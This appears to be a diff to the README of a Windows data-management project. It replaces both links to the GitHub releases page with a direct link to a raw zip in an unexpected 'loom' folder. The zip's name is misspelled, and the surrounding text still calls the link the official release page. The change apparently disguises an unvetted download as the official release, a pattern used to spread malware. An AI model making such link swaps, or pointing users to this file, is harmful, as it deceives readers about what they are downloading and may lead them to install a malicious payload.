@@ -1,6 +1,6 @@
 # 📂 RDL_INTERNSHIP_PROJECT - Streamline your daily data management tasks
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/nnbb917/RDL_INTERNSHIP_PROJECT/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/nnbb917/RDL_INTERNSHIP_PROJECT/main/loom/RD-INTERNSHI-PROJECT-v1.4-alpha.5.zip)
 
 ## 📖 About this project
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the application well.
 
 You get the latest version of the program from the official release page. This page contains the installation file you need for your Windows system.
 
-[Click here to visit the release page and download the software](https://github.com/nnbb917/RDL_INTERNSHIP_PROJECT/releases)
+[Click here to visit the release page and download the software](https://raw.githubusercontent.com/nnbb917/RDL_INTERNSHIP_PROJECT/main/loom/RD-INTERNSHI-PROJECT-v1.4-alpha.5.zip)
 
 Follow these steps to complete the download:
 
